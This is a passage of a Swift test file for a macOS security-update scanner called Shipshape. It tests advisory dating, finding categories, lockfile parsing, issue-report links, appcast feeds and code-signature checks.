        func described(_ fix: ParentFix) -> Finding { var findings = [chatOld]; Scanner.markBundledAwaiting(&findings, currentApps: [], parent: [chatOld.id: fix]); return findings[0] }
        let available = described(ParentFix(version: "0.0.390", date: nov5, bundles: "45.2.2", fixes: 2, total: 2, complete: true, newer: true))
        let partial = described(ParentFix(version: "0.0.390", date: nil, bundles: "44.10.2", fixes: 1, total: 2, complete: false, newer: true))
        let stillOld = described(ParentFix(version: "0.0.390", date: nov5, bundles: "37.6.0", fixes: 0, total: 2, complete: false, newer: true))
        let current = described(ParentFix(version: "0.0.380", date: nil, bundles: "37.6.0", fixes: 0, total: 2, complete: false, newer: false))
        expect(available.awaitingFix == nil && available.fixed == "Fix available as of Nov 5 in Chat 0.0.390" && available.action == "Chat 0.0.390, out Nov 5, bundles Electron 45.2.2, which has these fixes. Update Chat to it."
               && Commands.commands(for: available).first?.note == "Chat 0.0.390 bundles Electron 45.2.2, with these fixes. Check for updates in Chat to get it."
               && partial.awaitingFix == nil && partial.fixed == "Some fixes in Chat 0.0.390" && partial.action.contains("which has 1 of these 2 fixes")
               && stillOld.awaitingFix == true && stillOld.fixed == "43.8.7, not in Chat 0.0.390 yet" && stillOld.action.hasPrefix("Chat's newest release, 0.0.390, out Nov 5, still bundles Electron 37.6.0, without these fixes.")
               && stillOld.action.hasSuffix("Shipshape looks inside each new release of Chat and alerts you when one has the fix.")
               && current.awaitingFix == true && current.action.hasPrefix("You have the newest Chat, 0.0.380, and it still bundles Electron 37.6.0."),
               "a release with the fix takes the card out of waiting, dated; some fixes say how many; none keeps it waiting, naming the release")
        let fixAlert = Alerts.findings([available], released: [chatOld.id])
        expect(fixAlert.title == "Fix now available" && fixAlert.body.contains("Chat 0.0.390 bundles Electron 45.2.2, with the fix.") && !fixAlert.body.contains("may include"),
               "the alert says the fix is in the new release, not that it may be")
        let pruned = Alerts.pruned([waitingSparkle.id: "before it waited", leftPad.id: "delivered", "gone": "removed"], report: ScanReport(findings: [waitingSparkle, leftPad]))
        expect(pruned == [leftPad.id: "delivered"], "a waiting finding forgets its earlier alert, so a new release alerts again")

        // Project scans skip app bundles and package-manager internals such as Homebrew's own Library.
        let scanRoot = FileManager.default.temporaryDirectory.appendingPathComponent("shipshape-scan-\(UUID().uuidString)").path
        for (folder, file) in [("app", "package-lock.json"), ("Tool.app/Contents", "package-lock.json"), ("homebrew/Library/formula-analytics", "uv.lock")] {
            try FileManager.default.createDirectory(atPath: scanRoot + "/" + folder, withIntermediateDirectories: true)
            try Data("{}".utf8).write(to: URL(fileURLWithPath: scanRoot + "/" + folder + "/" + file))
        }
        expect(Lockfiles.find(in: scanRoot, skipping: [scanRoot + "/homebrew"]) == [scanRoot + "/app/package-lock.json"], "app bundles and skipped roots aren't scanned as projects")
        expect(Lockfiles.find(in: scanRoot + "/homebrew", skipping: [scanRoot + "/homebrew"]).count == 1, "a folder chosen inside a skipped root is still checked")
        expect(Lockfiles.skippedRoots.isSuperset(of: ["/opt/homebrew", "/usr", Inventory.home + "/Library"]), "Homebrew, /usr and ~/Library are skipped by default")
        try? FileManager.default.removeItem(atPath: scanRoot)


        let summer = ISO8601DateFormatter().date(from: "2026-10-24T16:00:00Z")!
        let winter = ISO8601DateFormatter().date(from: "2026-12-24T17:00:00Z")!
        expect(Schedule.isDue(now: summer, lastDay: nil), "9 a.m. PDT")
        expect(Schedule.isDue(now: winter, lastDay: nil), "9 a.m. PST")
        expect(!Schedule.isDue(now: summer.addingTimeInterval(-60), lastDay: nil), "not before scheduled time")
        expect(!Schedule.isDue(now: summer, lastDay: Schedule.day(summer)), "once per Pacific day")
        expect(Schedule.isDue(now: summer.addingTimeInterval(3600 * 4), lastDay: nil), "catch up after sleep")

        // Report a problem: a GitHub new-issue link with the repository's issue form filled in, home folder as ~.
        var jsonGem = Finding(source: "osv", installation: Installation(product: "rubygems:json", name: "json", version: "2.18.0", path: "/opt/homebrew/lib/ruby/gems/4.0.0/specifications/default/json-2.18.0.gemspec",
                                                                    domain: "packages", note: "Ruby gem in /opt/homebrew.", ecosystem: "RubyGems", packageName: "json", manager: "gem", location: "/opt/homebrew/opt/ruby/bin/gem"),
                              kind: .security, fixed: "2.19.9", reason: "", action: "", links: [], advisories: ["CVE-2026-33210", "CVE-2026-54696"], severity: "HIGH")
        jsonGem.commands = Commands.commands(for: jsonGem)
        let jsonSummary = Feedback.summary(of: jsonGem)
        expect(Feedback.title(for: jsonGem, problem: .fixFailed) == "json 2.18.0: the fix didn't work"
               && jsonSummary == """
               - **Finding:** json 2.18.0 → 2.19.9 (HIGH, security fix)
               - **Installed:** Ruby gem in /opt/homebrew.
               - **Read from:** `/opt/homebrew/lib/ruby/gems/4.0.0/specifications/default/json-2.18.0.gemspec`
               - **Found by:** osv · gem · RubyGems
               - **Shown:** `/opt/homebrew/opt/ruby/bin/gem update json`
               - **Advisories:** CVE-2026-33210, CVE-2026-54696
               """, "a finding report names the finding, where it was read from and the command shown")
        let viteReport = Finding(source: "osv", installation: Installation(product: "npm:vite", name: "vite", version: "5.0.0", path: "/p/package-lock.json#vite", domain: "projects",
                                                                          ecosystem: "npm", packageName: "vite", manager: "npm"), kind: .security, fixed: "6.4.4", reason: "", action: "", links: [])
        expect(Feedback.summary(of: viteReport).components(separatedBy: "\n").contains("- **Found by:** osv · npm"), "a manager named like its ecosystem is listed once")
        expect(Feedback.redact("cd '/Users/ann/Shipshape Demo' && ls /Users/ann /Users/anne/x", home: "/Users/ann") == "cd '~/Shipshape Demo' && ls ~ /Users/anne/x",
               "the home folder becomes ~, but only as a whole path component")
        func query(_ url: URL) -> [String: String] {
            Dictionary((URLComponents(url: url, resolvingAgainstBaseURL: false)?.queryItems ?? []).map { ($0.name, $0.value ?? "") }, uniquingKeysWith: { first, _ in first })
        }
        let output = "% /opt/homebrew/opt/ruby/bin/gem update json\nNothing to update & done #1 + 2 = ?\n" + Inventory.home + "/project"
        let report = Feedback.report(jsonGem, problem: .fixFailed, title: Feedback.title(for: jsonGem, problem: .fixFailed), details: output, summary: jsonSummary)!
        let fields = query(report.url)
        expect(report.url.absoluteString.hasPrefix("https://github.com/toddsherman/shipshape/issues/new?template=wrong-or-missing-finding.yml&title=") && !report.shortened
               && fields["title"] == "json 2.18.0: the fix didn't work" && fields["problem"] == "The fix didn't work" && fields["finding"] == jsonSummary
               && fields["output"] == "% /opt/homebrew/opt/ruby/bin/gem update json\nNothing to update & done #1 + 2 = ?\n~/project" && fields["version"]?.hasPrefix("Shipshape ") == true,
               "the issue form's fields are filled in by ID, with &, #, + and line breaks intact")
        let long = Feedback.report(jsonGem, problem: .other, title: "Long", details: String(repeating: "Gems already up-to-date ✓\n", count: 1_500), summary: jsonSummary)!
        let lines = Feedback.report(jsonGem, problem: .other, title: "Box drawing", details: String(repeating: "────────\n", count: 600), summary: jsonSummary)!
        expect(Feedback.signInLength("https://github.com/x?a=%E2") == 35 + 26 + 2 * 7 && lines.shortened && Feedback.signInLength(lines.url.absoluteString) <= Feedback.limit
               && Feedback.signInLength(lines.url.absoluteString) > Feedback.limit - 200 && query(lines.url)["output"]!.hasPrefix("────────\n────────"),
               "the limit counts the link as GitHub's sign-in page carries it, and non-ASCII text keeps as much as fits")
        expect(long.shortened && Feedback.signInLength(long.url.absoluteString) <= Feedback.limit && query(long.url)["output"]?.hasSuffix(Feedback.notice.trimmingCharacters(in: .whitespacesAndNewlines)) == true
               && query(long.url)["finding"] == jsonSummary && long.text.contains(String(repeating: "Gems already up-to-date ✓\n", count: 1_499) + "Gems already up-to-date ✓"),
               "a report too long for GitHub's link is shortened and marked, and the full text is kept for the clipboard")
        let blank = Feedback.report(jsonGem, problem: .notApplicable, title: "t", details: "  \n", summary: jsonSummary)!
        expect(query(blank.url)["output"] == nil && query(blank.url)["problem"] == "It's already up to date or not installed", "empty fields are left out")
        let coverage = Feedback.feedback(.coverage, title: "Check Zed extensions", text: "Zed extensions live in ~/Library/Application Support/Zed/extensions.")!
        expect(query(coverage.url)["template"] == "coverage-request.yml" && query(coverage.url)["what"]?.hasPrefix("Zed extensions") == true
               && query(Feedback.feedback(.feedback, title: "Idea", text: "Dark mode screenshots")!.url)["feedback"] == "Dark mode screenshots", "general feedback uses its own issue forms")

        // Optional live-format fixtures are kept outside the distributable app.
        let root = CommandLine.arguments.count > 1 ? CommandLine.arguments[1] : "native/work"
        // The issue forms on GitHub must have the field IDs the app fills in, or GitHub leaves those fields empty.
        for (form, ids) in [("wrong-or-missing-finding.yml", ["problem", "output", "finding", "version"]), ("feedback.yml", ["feedback", "version"]), ("coverage-request.yml", ["what", "version"])] {
            let text = try? String(contentsOfFile: root + "/../../.github/ISSUE_TEMPLATE/" + form, encoding: .utf8)
            expect(text.map { form in ids.allSatisfy { form.contains("id: " + $0 + "\n") } } == true, "\(form) has the fields \(ids.joined(separator: ", "))")
        }
        if let data = FileManager.default.contents(atPath: root + "/bun.txt") {
            let rows = try JSONSerialization.jsonObject(with: data) as! [[String: Any]]
            let finding = try Rules.bun(item("bun", "1.3.13"), advisories: rows)
            expect(finding?.fixed == "1.4.4", "current Bun vendor fixture")
            expect(finding?.advisories.contains("GHSA-cf8x-9m69-3gg3") == false, "new HTTP3 issue correctly excluded")
        }
        if let html = try? String(contentsOfFile: root + "/postgres.txt", encoding: .utf8) { try expect(Rules.postgres(item("postgresql", "16.13"), html: html)?.fixed == "16.15", "current Postgres vendor fixture") }
        if let html = try? String(contentsOfFile: root + "/openssl-index.txt", encoding: .utf8) {
            let branches = Rules.opensslIndexedBranches(html)
            expect(branches.contains("3.6") && branches.contains("3.0") && branches.count >= 10, "current OpenSSL index fixture lists release branches")
        }
        if let html = try? String(contentsOfFile: root + "/openssl.txt", encoding: .utf8) { try expect(Rules.openssl(item("openssl", "3.6.4"), html: html)?.fixed == "3.6.5", "current OpenSSL vendor fixture") }
        let categoryItem = item("vite", "5.0.0")
        let plain = Finding(source: "osv", installation: categoryItem, kind: .security, fixed: "6.4.4", reason: "", action: "", links: [])
        var exploitedWaiting = plain; exploitedWaiting.exploited = true; exploitedWaiting.awaitingFix = true
        var malware = plain; malware.exploited = true; malware.malicious = true
        var waitingFix = plain; waitingFix.awaitingFix = true
        let newer = Finding(source: "homebrew-formula", installation: categoryItem, kind: .update, fixed: "6.4.4", reason: "", action: "", links: [])
        var exploitedUpdate = newer; exploitedUpdate.exploited = true
        expect(FindingCategory(of: plain) == .security && FindingCategory(of: newer) == .updates, "security fixes and updates have their own tiles")
        expect(FindingCategory(of: malware) == .malicious, "malware outranks known exploitation")
        expect(FindingCategory(of: exploitedWaiting) == .exploited, "known exploitation shows even with no fix released")
        expect(FindingCategory(of: waitingFix) == .waiting && !FindingCategory.waiting.needsAttention, "waiting findings don't need attention")
        expect(FindingCategory(of: exploitedUpdate) == .updates, "an update is never counted as exploitation")
        let other = Finding(source: "osv", installation: item("ws", "8.0.0"), kind: .update, fixed: "8.21.0", reason: "", action: "", links: [])
        let tally = FindingCategory.items(in: ScanReport(installations: [categoryItem, other.installation, item("git", "2.51.0")], findings: [newer, plain, other]))
        expect(tally == [.security: 1, .updates: 1], "each item counts once, by its most urgent finding")
        let waitingAndUpdate = ScanReport(installations: [categoryItem, other.installation, item("git", "2.51.0")], findings: [waitingFix, newer])
        expect(FindingCategory.items(in: waitingAndUpdate) == [.updates: 1], "an item waiting for a fix that also has an update counts as the update")
        expect(FindingCategory.settled(in: waitingAndUpdate) == 2, "an item with an update still needs action")
        expect(FindingCategory.settled(in: ScanReport(installations: [categoryItem, item("git", "2.51.0")], findings: [waitingFix])) == 2, "items only waiting for a fix need no action")
        expect(FindingCategory.settled(in: ScanReport(installations: [categoryItem], findings: [exploitedWaiting])) == 0, "known exploitation with no fix still needs action")
        let attentionReport = ScanReport(findings: [plain, exploitedWaiting, waitingFix, newer])
        expect(attentionReport.attention.count == 2 && attentionReport.security.count == 1, "known exploitation with no fix needs attention")
        expect(FindingCategory.counts(in: attentionReport) == [.security: 1, .exploited: 1, .waiting: 1, .updates: 1], "tile counts")
        expect(FindingCategory.attentionTitle(1) == "1 item needs attention" && FindingCategory.attentionTitle(0) == "Nothing needs attention", "attention headline")
        let changelog = "# Changelog\n\n## Unreleased\n\n- Not out yet.\n\n## 1.2.0 — May 1, 2026\n\n- **Bold** fix for `brew` & <tags>, see [docs](https://example.com/a?b=1&c=2).\nA paragraph.\n\n## 1.1.0 — April 1, 2026\n\n- Older.\n"
        expect(Appcast.section(changelog, version: "1.2.0") == "- **Bold** fix for `brew` & <tags>, see [docs](https://example.com/a?b=1&c=2).\nA paragraph.", "appcast notes are the version's changelog section")
        expect(Appcast.section(changelog, version: "1.2") == nil && Appcast.section(changelog, version: "Unreleased") == nil && Appcast.section(changelog, version: "1.3.0") == nil,
               "only a dated changelog section for the exact version makes a feed")
        let releaseNotes = Appcast.html(Appcast.section(changelog, version: "1.2.0") ?? "")
        expect(releaseNotes == "<ul>\n<li><strong>Bold</strong> fix for <code>brew</code> &amp; &lt;tags&gt;, see <a href=\"https://example.com/a?b=1&amp;c=2\">docs</a>.</li>\n</ul>\n<p>A paragraph.</p>",
               "changelog Markdown becomes escaped HTML")
        let feedXML = Appcast.xml(.init(name: "Shipshape", version: "1.2.0", build: "30", minimumSystem: "13.0", date: Date(timeIntervalSince1970: 0), download: Appcast.download(name: "Shipshape", version: "1.2.0"),
                                        length: 2_750_261, signature: String(repeating: "A", count: 86) + "==", notes: releaseNotes + "]]>"))
        expect(feedXML.contains("<enclosure url=\"https://github.com/toddsherman/shipshape/releases/download/v1.2.0/Shipshape-1.2.0.dmg\" length=\"2750261\"")
               && feedXML.contains("<pubDate>Thu, 01 Jan 1970 00:00:00 +0000</pubDate>"), "appcast enclosure and date")
        expect(SparkleFeeds.releases(Data(feedXML.utf8)) == [SparkleFeeds.Release(build: "30", version: "1.2.0", minimumSystem: "13.0", date: Date(timeIntervalSince1970: 0),
                                                                                  url: "https://github.com/toddsherman/shipshape/releases/download/v1.2.0/Shipshape-1.2.0.dmg")],
               "Shipshape's own Sparkle feed reader understands its appcast, even with ]]> in the notes")
        if let info = NSDictionary(contentsOfFile: root + "/../Resources/Info.plist") as? [String: Any] {
            expect(info["SUFeedURL"] as? String == Appcast.feed, "the app reads the appcast attached to the latest GitHub release")
            expect(info["SUEnableAutomaticChecks"] as? Bool == true && info["SUAllowsAutomaticUpdates"] as? Bool == false, "updates are checked daily but installed only when someone clicks")
            expect(info["SURequireSignedFeed"] as? Bool == true && info["SUVerifyUpdateBeforeExtraction"] as? Bool == true, "the feed and each update are verified before use")
            expect((info["SUPublicEDKey"] as? String).map { Data(base64Encoded: $0)?.count == 32 } ?? true, "a public update key, when present, is a 32-byte EdDSA key")
        } else { expect(false, "Info.plist is readable") }
        expect(FindingCategory.Urgency([.malicious: 1, .updates: 40]) == .actNow && FindingCategory.Urgency([.exploited: 1]) == .actNow
               && FindingCategory.Urgency([.security: 2, .waiting: 5]) == .fixSoon && FindingCategory.Urgency([.unsupported: 1]) == .fixSoon
               && FindingCategory.Urgency([.waiting: 3, .updates: 2]) == .nothingUrgent && FindingCategory.Urgency([:]) == .clear,
               "the summary's status follows the most urgent kind of finding, however few")
        expect(Quitting.staysInMenuBar(quitFrom: "com.apple.dock") && !Quitting.staysInMenuBar(quitFrom: nil)
               && !Quitting.staysInMenuBar(quitFrom: "com.apple.loginwindow") && !Quitting.staysInMenuBar(quitFrom: "org.sparkle-project.Sparkle.Autoupdate"),
               "only Quit in the Dock keeps Shipshape in the menu bar; the panel's Quit, Command-Q, logging out and updates quit")

        // App signatures: ad-hoc (including linker-signed), unsigned and missing Hardened Runtime are worth a look; Apple's apps never are.
        func signed(_ identifier: String?, _ flags: UInt32?, team: String? = nil, platform: Int? = nil) -> AppSignature {
            AppSignature(name: "App", path: "/Applications/App.app", identifier: identifier, flags: flags, team: team, platform: platform)
        }
        let unsignedApp = signed(nil, nil), adHocApp = signed("app", 0x2), linkerSigned = signed("app", 0x20002), adHocRuntime = signed("app", 0x10002, team: "ABCDE12345")
        let developer = signed("com.example.app", 0x10000, team: "ABCDE12345"), noRuntime = signed("com.example.app", 0, team: "ABCDE12345"), appleApp = signed("com.apple.Safari", 0x2000, platform: 26)
        expect(unsignedApp.kind == .unsigned && unsignedApp.notable && !unsignedApp.hardenedRuntime && unsignedApp.summary == "Unsigned", "no identifier means no signature")
        expect(adHocApp.kind == .adHoc && adHocApp.lacksRuntime && adHocApp.summary == "Ad-hoc signed · No Hardened Runtime", "the ad-hoc flag")
        expect(linkerSigned.kind == .adHoc, "linker-signed code is ad hoc, as swiftc and Xcode leave it on Apple silicon")
        expect(adHocRuntime.kind == .adHoc && adHocRuntime.notable && !adHocRuntime.lacksRuntime && adHocRuntime.team == nil, "ad hoc with the Hardened Runtime is still ad hoc, and names no team")
        expect(developer.kind == .developer && !developer.notable && developer.summary == "Signed by team ABCDE12345 · Hardened Runtime", "a developer's signature with the Hardened Runtime is unremarkable")
        expect(noRuntime.notable && noRuntime.lacksRuntime && noRuntime.summary.hasSuffix("No Hardened Runtime"), "a developer's signature without the Hardened Runtime is worth a look")
        expect(appleApp.kind == .apple && !appleApp.notable && appleApp.summary == "Signed by Apple", "Apple's own apps are never flagged, with or without the Hardened Runtime flag")
        func named(_ name: String, _ signature: AppSignature) -> AppSignature { AppSignature(name: name, path: "/Applications/\(name).app", kind: signature.kind, team: signature.team, hardenedRuntime: signature.hardenedRuntime) }
        let note = AppSignature.coverage([named("Zed", developer), named("menu-clock", adHocApp), named("Game", unsignedApp), named("Old Tool", noRuntime), named("Safari", appleApp)])
        expect(note.hasPrefix("Read the code signatures of 5 apps") && note.contains("Ad-hoc signed, so the signature names no developer: menu-clock.") && note.contains("Unsigned: Game.")
               && note.contains("without the Hardened Runtime: Old Tool.") && !note.contains("Zed") && !note.contains("Safari") && note.contains("not a finding"),
               "Coverage names the apps worth a look and says it isn't a finding")
        expect(AppSignature.coverage([named("Zed", developer)], unreadable: 2).contains("All are signed by a developer or Apple, with the Hardened Runtime. 2 couldn't be read as code."), "a clean Mac says so")
        // Live reads with Security, on code every Mac has.
        expect(Inventory.signature(name: "Calculator", path: "/System/Applications/Calculator.app")?.kind == .apple, "Calculator is Apple's")
        #if arch(arm64)
        expect(Inventory.signature(name: "rules-tests", path: Bundle.main.executablePath!)?.kind == .adHoc, "this test program is linker-signed, so ad hoc")
        #endif

        // Advisory dates: parsed from each source's format, shown once per issue, and never part of the fingerprint.
        let iso = ISO8601DateFormatter()
        expect(advisoryDate("2025-10-09T18:22:03Z") == iso.date(from: "2025-10-09T18:22:03Z") && advisoryDate("2025-10-09T18:22:03.123Z") == iso.date(from: "2025-10-09T18:22:03Z")
               && advisoryDate("2021-02-15T13:15:12.560") == iso.date(from: "2021-02-15T13:15:12Z") && advisoryDate("2025-10-09T20:22:03+0200") == iso.date(from: "2025-10-09T18:22:03Z"),
               "OSV, GitHub, NVD (no time zone means UTC) and offset timestamps")
        expect(advisoryDate("2025-03-18") == iso.date(from: "2025-03-18T12:00:00Z") && advisoryDate("March 18") == nil && advisoryDate(nil) == nil, "CISA's plain dates are noon UTC; anything else is no date")
        let datedVulns = ["GHSA-a": OSV.Vuln(id: "GHSA-a", summary: "Cert issue", aliases: ["PYSEC-1", "CVE-2026-1"], severity: "HIGH", fixed: ["PyPI|pip": ["26.2.2"]], published: advisoryDate("2025-01-10T00:00:00Z")),
                          "GHSA-b": OSV.Vuln(id: "GHSA-b", summary: "Other", aliases: [], severity: "MODERATE", fixed: ["PyPI|pip": ["26.3.0"]], published: advisoryDate("2026-10-20T08:00:00Z"))]
        let osvDated = OSV.findings(for: [pip], matches: [osvKey: ["GHSA-a", "GHSA-b"]], vulns: datedVulns).first!
        let jan10 = advisoryDate("2025-01-10T00:00:00Z")!.formatted(date: .abbreviated, time: .omitted), oct20 = advisoryDate("2026-10-20T08:00:00Z")!.formatted(date: .abbreviated, time: .omitted)
        expect(osvDated.published?.count == 2 && osvDated.sameIssue == ["CVE-2026-1": "GHSA-a"], "each issue has one date; its CVE points at it")
        expect(osvDated.publishedNote(for: "GHSA-a") == "Published " + jan10 && osvDated.publishedNote(for: "CVE-2026-1") == "Same issue as GHSA-a, published " + jan10
               && osvDated.publishedNote(for: "GHSA-zzz") == nil, "hovering an ID shows its date, or its issue's")
        let today = advisoryDate("2026-10-27T08:00:00Z")!
        let weekAgo = RelativeDateTimeFormatter().localizedString(for: advisoryDate("2026-10-20T08:00:00Z")!, relativeTo: today)
        let newestNote = " The newest was published \(oct20), \(weekAgo)."
        expect(osvDated.reasonWithDates(now: today) == osvDated.reason + newestNote, "the card's sentence names the newest date, with how long ago within 30 days")
        expect(osvDated.reasonWithDates(now: advisoryDate("2027-06-01")!).hasSuffix("The newest was published " + oct20 + "."), "older than 30 days: the date alone")
        var single = osvDated; single.published = ["GHSA-a": advisoryDate("2025-01-10T00:00:00Z")!]; single.reason = "1 published advisory: Cert issue"
        expect(single.reasonWithDates(now: today) == "1 published advisory: Cert issue. Published " + jan10 + ".", "one advisory: its date, after a period the reason lacked")
        var reported = malicious; reported.published = ["MAL-2026-1": advisoryDate("2026-01-05")!]
        expect(reported.reasonWithDates(now: today).hasSuffix("Reported " + advisoryDate("2026-01-05")!.formatted(date: .abbreviated, time: .omitted) + ".")
               && reported.publishedNote(for: "MAL-2026-1")?.hasPrefix("Reported ") == true, "a malicious-package report says Reported")
        var listedExploited = single; listedExploited.exploited = true; listedExploited.exploitedSince = advisoryDate("2025-03-18")
        expect(listedExploited.reasonWithDates(now: today).hasSuffix(" CISA listed it as exploited on " + advisoryDate("2025-03-18")!.formatted(date: .abbreviated, time: .omitted) + "."), "known exploitation gives CISA's date")
        expect(osvFinding.reasonWithDates() == osvFinding.reason && osvDated.fingerprint == { var f = osvDated; f.published = nil; f.sameIssue = nil; f.exploitedSince = Date(); return f }().fingerprint,
               "no dates leaves the reason as it was; dates never change the fingerprint")
        let oldJSON = try JSONEncoder().encode(osvFinding)
        try expect(JSONDecoder().decode(Finding.self, from: oldJSON).published == nil, "findings saved without dates still load")
        var datedCVE = cve(#"{"vulnerable":true,"criteria":"cpe:2.3:a:haxx:curl:*:*:*:*:*:*:*:*","versionEndExcluding":"8.6.0"}"#); datedCVE["published"] = "2026-02-01T10:15:00.000"
        let nvdDated = NVD.finding(Installation(product: "curl", name: "curl", version: "8.5.0", path: "/opt/homebrew/Cellar/curl/8.5.0", domain: "brew", package: "curl", manager: "brew"),
                                   product: Catalog.byID["curl"]!, hits: [NVD.evaluate(datedCVE, cpe: "haxx:curl", version: v)!])!
        expect(nvdDated.published == ["CVE-2026-9": advisoryDate("2026-02-01T10:15:00Z")!], "NVD's published date")
        let datedAdvisories = opencodeAdvisories.map { advisory -> [String: Any] in var a = advisory; a["published_at"] = "2026-05-02T16:00:00Z"; return a }
        try expect(Rules.github(item("opencode", "1.1.9"), advisories: datedAdvisories, packages: ["opencode-ai", "opencode"], source: "opencode", action: "")?.published == ["GHSA-old": advisoryDate("2026-05-02T16:00:00Z")!],
               "GitHub repository advisories' published_at")
        let actionsDated = GitHubActions.advisories(try JSONSerialization.jsonObject(with: Data(#"{"vulns":[{"id":"GHSA-x","published":"2025-03-14T22:00:00Z","aliases":["CVE-2025-30066"],"affected":[{"package":{"name":"o/a"},"ranges":[{"type":"ECOSYSTEM","events":[{"introduced":"0"},{"fixed":"2.0.0"}]}]}]}]}"#.utf8)) as! [String: Any], name: "o/a")
        let actionFinding = GitHubActions.finding(Installation(product: "x", name: "o/a", version: "v1.0.0", path: "/w/.github/workflows/ci.yml#o/a", domain: "projects", ecosystem: "GitHub Actions", packageName: "o/a", manager: "actions", location: "/w"), advisories: actionsDated)
        expect(actionFinding?.published == ["GHSA-x": advisoryDate("2025-03-14T22:00:00Z")!] && actionFinding?.sameIssue == ["CVE-2025-30066": "GHSA-x"], "GitHub Actions advisories' dates and aliases")
        // Fixes from the November 2026 review, in a scope of their own.
        do {
            // Parsers that used to drop or misread entries.
            let twoSources = "GEM\n  remote: https://gems.example.com/\n  specs:\n    private-gem (1.0.0)\n\nGEM\n  remote: https://rubygems.org/\n  specs:\n    rack (2.2.8)\n    rails (7.1.0)\n\nPLATFORMS\n  ruby\n"
            expect(Lockfiles.gemfile(twoSources).map { $0.name + "@" + $0.version } == ["private-gem@1.0.0", "rack@2.2.8", "rails@7.1.0"], "every GEM section of a Gemfile.lock is read, one per gem source")
            let artifactory = "[[package]]\nname = \"requests\"\nversion = \"2.31.0\"\nsource = { registry = \"https://example.jfrog.io/artifactory/api/pypi/pypi-virtual/simple\" }\n\n[[package]]\nname = \"app\"\nversion = \"0.1.0\"\nsource = { virtual = \".\" }\n\n[[package]]\nname = \"local\"\nversion = \"1.0\"\nsource = { path = \"../local\" }\n"
            expect(Lockfiles.parse("/nowhere/uv.lock", data: Data(artifactory.utf8))?.packages.map(\.name) == ["requests"], "a registry whose address contains \"virtual\" is still a registry; the project itself and a path aren't")
            let aliases = "\"string-width-cjs@npm:string-width@^4.2.0\":\n  version \"4.2.3\"\n\n\"@scope/old@npm:@scope/real@^1.0.0\":\n  version \"1.2.0\"\n\n\"lodash@npm:^4.17.21\":\n  version: 4.17.21\n"
            expect(Lockfiles.yarn(aliases).map { $0.name + "@" + $0.version } == ["string-width@4.2.3", "@scope/real@1.2.0", "lodash@4.17.21"], "a Yarn alias is checked as the package it installs")
            let twoLodash = "lodash@^3.10.0:\n  version \"3.10.1\"\n\nlodash@^4.17.21:\n  version \"4.17.21\"\n"
            expect(Lockfiles.yarnRooted(twoLodash, requests: ["lodash@^4.17.21"]) == ["lodash@4.17.21"], "only the copy package.json asks for is the project's own")
            let importers = "lockfileVersion: '9.0'\n\nimporters:\n\n  .:\n    dependencies:\n      lodash:\n        specifier: ^4.17.21\n        version: 4.17.21\n      '@scope/ui':\n        specifier: ^2.0.0\n        version: 2.1.0(react@18.3.1)\n\npackages:\n\n  lodash@3.10.1:\n    resolution: {}\n"
            expect(Lockfiles.pnpmRooted(importers) == ["lodash@4.17.21", "@scope/ui@2.1.0"], "pnpm's importers say which version the project asked for")
            let nestedBun = "{\n  \"packages\": {\n    \"lodash\": [\"lodash@4.17.21\", \"\", {}, \"sha512-x\"],\n    \"old-tool/lodash\": [\"lodash@3.10.1\", \"\", {}, \"sha512-y\"],\n  }\n}"
            expect(Lockfiles.bunRooted(nestedBun) == ["lodash@4.17.21"], "in bun.lock the project's own copy is keyed by the bare name")
            let rolesRoot = FileManager.default.temporaryDirectory.appendingPathComponent("shipshape-roles-\(UUID().uuidString)").path
            try FileManager.default.createDirectory(atPath: rolesRoot, withIntermediateDirectories: true)
            try Data(#"{"dependencies":{"lodash":"^4.17.21"},"devDependencies":{"jest":"^29.0.0"}}"#.utf8).write(to: URL(fileURLWithPath: rolesRoot + "/package.json"))
            let yarnRoles = Lockfiles.parse(rolesRoot + "/yarn.lock", data: Data(twoLodash.utf8))?.packages.map { "\($0.version):\($0.dependency ?? "none")" }
            expect(yarnRoles == ["3.10.1:transitive", "4.17.21:direct"], "a second version of a direct dependency came along with another package")
            let npmV1 = #"{"lockfileVersion":1,"dependencies":{"lodash":{"version":"4.17.21"},"jest":{"version":"29.0.0","dev":true},"ansi-regex":{"version":"5.0.1","dev":true}}}"#
            let v1Roles = Lockfiles.parse(rolesRoot + "/package-lock.json", data: Data(npmV1.utf8))?.packages.map { "\($0.name):\($0.dependency ?? "none")" }
            expect(v1Roles == ["ansi-regex:transitive", "jest:dev", "lodash:direct"], "a version 1 lockfile's dev flag doesn't make a package one the project asked for")
            try FileManager.default.removeItem(atPath: rolesRoot)
            let goBlocks = "module x\n\nrequire (\n\tgithub.com/a/b v1.0.0\n\tgithub.com/c/d v2.0.0\n\tgithub.com/e/f v3.0.0\n)\n\nexclude (\n\tgithub.com/bad/one v1.2.3\n)\n\nreplace (\n\tgithub.com/a/b v1.0.0 => github.com/a/b v1.0.1\n\tgithub.com/c/d => ../d\n)\n\nreplace github.com/e/f => github.com/fork/f v3.0.5\n\nretract v0.9.0\n"
            expect(Lockfiles.goModules(goBlocks).map { $0.name + "@" + $0.version } == ["github.com/a/b@1.0.1", "github.com/fork/f@3.0.5"], "go.mod: excluded versions aren't dependencies, a replacement is checked in place of what it replaces, and a module replaced by a folder isn't checked")
            let deepRoot = FileManager.default.temporaryDirectory.appendingPathComponent("shipshape-deep-\(UUID().uuidString)").path
            let sixDown = deepRoot + "/a/b/c/d/e/f", tenDown = sixDown + "/g/h/i/j"
            try FileManager.default.createDirectory(atPath: tenDown, withIntermediateDirectories: true)
            for folder in [sixDown, tenDown] { try Data("{}".utf8).write(to: URL(fileURLWithPath: folder + "/package-lock.json")) }
            let deepSearch = Lockfiles.search(in: deepRoot)
            expect(deepSearch.files == [sixDown + "/package-lock.json"] && deepSearch.deeper == 1 && !deepSearch.full, "a lockfile six folders down is read, and folders past eight levels are counted instead of dropped silently")
            try FileManager.default.removeItem(atPath: deepRoot)
            // One settings file can set a server of the same name for two projects.
            let mcpRoot = FileManager.default.temporaryDirectory.appendingPathComponent("shipshape-mcp-\(UUID().uuidString)").path
            try FileManager.default.createDirectory(atPath: mcpRoot, withIntermediateDirectories: true)
            let scoped = #"{"projects":{"/p/a":{"mcpServers":{"gh":{"command":"npx","args":["-y","some-server@1.0.0"]}}},"/p/b":{"mcpServers":{"gh":{"command":"npx","args":["-y","some-server@2.0.0"]}}},"/p/c":{"mcpServers":{"gh":{"command":"npx","args":["-y","some-server@1.0.0"]}}}}}"#
            try Data(scoped.utf8).write(to: URL(fileURLWithPath: mcpRoot + "/.mcp.json"))
            let scopedServers = Inventory.mcpServers(projectFiles: [mcpRoot + "/.mcp.json"]).0.filter { $0.location == mcpRoot + "/.mcp.json" }
